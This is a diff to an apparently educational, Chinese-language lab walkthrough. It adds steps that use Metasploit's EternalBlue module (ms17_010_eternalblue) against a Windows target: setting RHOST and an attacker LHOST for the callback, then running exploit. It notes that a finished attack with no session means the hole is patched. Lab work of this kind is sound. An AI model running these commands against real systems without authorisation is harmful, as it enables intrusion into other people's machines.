@@ -54,7 +54,26 @@ sudo msfconsole
 - Metasploit Framework成功開啟畫面
 - ![image](https://github.com/user-attachments/assets/d458bf3b-5619-41b7-9a0d-47eebbd6fe4c)
 ### Step 4
-- 
+- **4-1使用metasploit的自動化漏洞模塊**
+```
+use exploit/windows/smb/ms17_010_eternalblue
+```
+- **4-2設置要攻擊的系統IP位址**
+```
+set RHOST [目標IP]
+```
+- ![image](https://github.com/user-attachments/assets/4e290b13-a2e3-4473-b5a7-66090fe51713)
+- **4-3設置攻擊成功後要返回的攻擊機IP地址**
+```
+set LHOST [攻擊機IP]
+```
+- **4-4開始漏洞利用**
+```
+exploit
+```
+- 顯示已完成攻擊,但並未建立任何的連線,就代表該漏洞已經被修復了。
+- ![螢幕擷取畫面 2024-10-13 154541](https://github.com/user-attachments/assets/831df7d6-3542-4b60-8e54-46f2d41fec57)
+
 - 利用漏洞掃描工具掃描可利用的系統漏洞
 - 利用系統漏洞進入Windows Server
 ### Step 4
